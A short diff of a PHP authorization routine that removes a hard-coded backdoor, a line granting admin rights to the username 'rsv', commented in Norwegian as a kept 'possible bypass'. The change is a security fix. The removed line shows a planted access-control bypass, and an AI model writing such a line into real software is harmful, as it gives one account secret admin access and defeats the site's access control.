@@ -165,7 +165,6 @@ $isAdmin = (bool)($_SESSION['is_admin'] ?? false);
 if (!$isAdmin) {
     $isAdmin = has_any(['admin', 'administrator', 'superadmin'], $roles);
 }
-if ($username === 'rsv') { $isAdmin = true; } // beholdt evt. bypass
 if ($isAdmin) {
     $_SESSION['is_admin'] = true;
 }
